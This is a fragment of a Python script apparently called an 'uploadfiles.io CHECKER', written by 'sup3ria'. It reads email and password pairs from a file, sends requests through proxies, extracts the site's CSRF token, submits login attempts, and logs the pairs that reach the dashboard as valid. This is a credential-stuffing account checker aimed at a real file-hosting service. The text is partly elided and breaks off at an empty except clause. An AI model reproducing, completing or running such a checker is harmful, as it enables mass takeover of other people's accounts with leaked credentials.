...
asci = '''
uploadfiles.io CHECKER - by sup3ria
'''
print asci

parser = argparse.ArgumentParser(description='uploadfiles.io checker 2018')
parser.add_argument('-i','--input', help='input.txt', required=False,type=str,default="input.txt")
parser.add_argument('-o','--output', help='output.txt', required=False,type=str,default="uploadfiles_valid.txt")
...
def sub_worker(task, ip_port):
    try:
        ...
        token = str(soup.find("input", { "id" : "csrf_hash"})).split('value="')[1][:-3]
        data = {'csrf_test_name': token, 'email': email, 'password': passwd}
        r = s.post(url, data=data, cookies=jar,allow_redirects=True,headers={'User-Agent': ua,'Accept':'*/*'})
        if r.url == "https://uploadfiles.io/dashboard":
            return True
        else:
            return False
    except:
